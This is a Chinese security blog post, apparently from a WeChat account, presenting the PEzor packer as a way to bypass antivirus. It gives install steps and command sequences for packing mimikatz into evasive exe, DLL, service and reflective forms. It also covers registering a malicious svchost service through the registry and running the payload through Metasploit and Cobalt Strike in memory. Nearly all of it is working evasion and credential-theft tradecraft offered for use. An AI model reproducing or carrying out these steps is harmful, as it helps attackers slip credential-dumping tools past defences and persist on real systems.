> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/gyYumUgCMXj4BV2p0-cvBA)

> 本文由海阳顶端授权发布    介绍一款很强大的工具，
> 
> https://github.com/phra/PEzor, 主要是用于通过反射来执行 exe 或 shellcode，从而来绕过 AV。

这款工具主要是安装稍微麻烦一点，需要在 KAIL 系统下安装。

```
$ git clone https://github.com/phra/PEzor.git$ cd PEzor$ sudo bash install.sh$ bash PEzor.sh -h
```

![](https://mmbiz.qpic.cn/mmbiz_png/r5ic5orS6QQ6ExVG2LpIK64C7jJZLBA6VsyczllBzAOUmq6Flq8tfc2uibTgP9BpKPFN2G198k0t2AMPiblibbVu1g/640?wx_fmt=png)

经过漫长的等待后，会给你安装 Mingw-w64 和 LLVM / Clang 的工具链。不过使用 PEzor 的时候，这时仍然会给你弹出一些错误提示。主要是环境变量和缺少了

https://github.com/EgeBalci/sgn。这里你需要做两步：

1、当前 bash 窗口导入 PEzor 的环境变量。

> export PATH=$PATH:~/go/bin/:/home/kali/PEzor:/home/kali/PEzor/deps/donut_v0.9.3/:/home/kali/PEzor/deps/wclang/_prefix_PEzor_/bin/

![](https://mmbiz.qpic.cn/mmbiz_jpg/r5ic5orS6QQ6ExVG2LpIK64C7jJZLBA6V5rqDD7Wf7v9IG6wv2WOQiarUcqwc9STQATSWeicrhELZvzdUbDMcCFrg/640?wx_fmt=jpeg)

2、下载

https://github.com/EgeBalci/sgn，解压后放入 PEzor 的目录。

![](https://mmbiz.qpic.cn/mmbiz_png/r5ic5orS6QQ6ExVG2LpIK64C7jJZLBA6VqlYEycrR89LuEJcwKYxkxBHKKqIZu6PAVpRgvHlrfxFs6rnI3uawWA/640?wx_fmt=png)

一切就绪后，我们来看下它强大的功能。

![](https://mmbiz.qpic.cn/mmbiz_jpg/r5ic5orS6QQ6ExVG2LpIK64C7jJZLBA6V6xbCSlROKynsicEWC1ZFEwjJUWY25tibGzy3vy0NUUld51Lib9BMQ8baA/640?wx_fmt=jpeg)

我们以 mimikatz 来举几例具体用法。

一、生成变异的 exe

```
# generate$ PEzor -format=exe mimikatz.exe -z 2 -p '"token::whoami" "exit"'# executeC:> .\mimikatz.exe.packed.exe
```

二、生成变异的 DLL

```
# generate$ PEzor -format=dll mimikatz.exe -z 2 -p '"token::whoami" "exit"'# executeC:> rundll32 .\mimikatz.exe.packed.dll,DllMain
```

三、生成可以加载服务的变形 exe

```
# generate$ PEzor -format=service-exe mimikatz.exe -z 2 -p '"log C:/Users/Public/mimi.out" "coffee" "exit"'# executeC:\Users\Public> sc create mimiservice binpath= C:\Users\Public\mimikatz.exe.packed.service.exe[SC] CreateService SUCCESSC:\Users\Public> sc start mimiserviceSERVICE_NAME       : mimiservice        TYPE               : 20  WIN32_OWN_PROCESS        STATE              : 4  RUNNING                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)        WIN32_EXIT_CODE    : 0  (0x0)        SERVICE_EXIT_CODE  : 0  (0x0)        CHECKPOINT         : 0x0        WAIT_HINT          : 0x0        PID                : 913        FLAGS              : 0x0
```

四、生成可以加载服务的变形 DLL

```
# generate$ PEzor -format=service-dll mimikatz.exe -z 2 -p '"log C:/Users/Public/mimi.out" "coffee" "exit"'# executeC:\Users\Public> copy /y mimikatz.packed.exe.service.dll %SystemRoot%\System32\SvcHostDemo.dll        1 file(s) copied.C:\Users\Public> sc create SvcHostDemo binpath= ^%SystemRoot^%"\System32\svchost -k mygroup" type= share start= demand[SC] CreateService SUCCESSC:\Users\Public> reg add "HKLM\SYSTEM\CurrentControlSet\services\SvcHostDemo\Parameters /v ServiceDll /t REG_EXPAND_SZ /d ^%SystemRoot^%\System32\SvcHostDemo.dll /fThe operation completed successfully.C:\Users\Public> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost" /v mygroup /t REG_MULTI_SZ /d SvcHostDemo /fThe operation completed successfully.C:\Users\Public> sc start SvcHostDemoSERVICE_NAME       : SvcHostDemo        TYPE               : 30  WIN32        STATE              : 2  START_PENDING                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)        WIN32_EXIT_CODE    : 0  (0x0)        SERVICE_EXIT_CODE  : 0  (0x0)        CHECKPOINT         : 0x0        WAIT_HINT          : 0x7d0        PID                : 1823        FLAGS              : 0x0
```

五、生成反射性的 reflective-dll

```
# generate$ PEzor -format=reflective-dll mimikatz.exe -z 2 -p '"log mimi.out" "coffee" "exit"'# executemsf5 > use post/windows/manage/reflective_dll_injectmsf5 post(windows/manage/reflective_dll_inject) > set PATH mimikatz.exe.packed.reflective.dllmsf5 post(windows/manage/reflective_dll_inject) > set WAIT 10msf5 post(windows/manage/reflective_dll_inject) > run
```

![](https://mmbiz.qpic.cn/mmbiz_png/r5ic5orS6QQ6ExVG2LpIK64C7jJZLBA6VuymPSlibwkF2ZC5CbdHeicLYT50m3ZCQMPJicia9GUickKlAEiclQN3K9QIg/640?wx_fmt=png)

六、生成. NET 的 DLL

```
# generate$ PEzor -format=dotnet mimikatz.exe -z 2 -p '"log mimi.out" "coffee" "exit"'# executemsf5 > use post/windows/manage/execute_dotnet_assemblymsf5 post(windows/manage/execute_dotnet_assembly) > set DOTNET_EXE mimikatz.exe.packed.dotnet.exemsf5 post(windows/manage/execute_dotnet_assembly) > set WAIT 10msf5 post(windows/manage/execute_dotnet_assembly) > run
```

![](https://mmbiz.qpic.cn/mmbiz_png/r5ic5orS6QQ6ExVG2LpIK64C7jJZLBA6VmYUS9OuCBiciaBlX0rJJDxViaj2jaYa0wdHd17F1J9ibyTT8zTVBnTUZcg/640?wx_fmt=png)

七、另外，它也支持 Cobalt Strike Integration

```
# convert and execute reflective DLLbeacon> execute-inmemory -format=reflective-dll mimikatz.exe -z 2 -p '"coffee" "exit"'# convert and execute .NET assemblybeacon> execute-inmemory -format=dotnet mimikatz.exe -z 2 -p '"coffee" "exit"'
```

![](https://mmbiz.qpic.cn/mmbiz_png/r5ic5orS6QQ6ExVG2LpIK64C7jJZLBA6VC46FKX5qkPaaXsianx5Z77crjOab9KqrElov6Njh5maDTp5JZQncmfg/640?wx_fmt=png)

这个 Cobalt Strike 的插件地址在

https://github.com/phra/PEzor/blob/master/aggressor/PEzor.cna。

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

一如既往的学习，一如既往的整理，一如即往的分享。感谢支持![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icl7QVywL8iaGT0QBGpOwgD1IwN0z9JicTRvzvnsJicNRr2gRvJib6jKojzC5CJJsFPkEbZQJ999HrH5Gw/640?wx_fmt=png)  

“如侵权请私聊公众号删文”

****扫描关注 LemonSec****  

![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icncXiavFRorU03O5AoZQYznLCnFJLs8RQbC9sltHYyicOu9uchegP88kUFsS8KjITnrQMfYp9g2vQfw/640?wx_fmt=png)

**觉得不错点个 **“赞”**、“在看” 哦****![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT1YhlAJOGvAaVRV0ZSSnX46ibouOHe05icukBYibdJOiaOpO06ic5eb0EMW1yhjMNRe1ibu5HuNibCcrGsqw/640?wx_fmt=png)**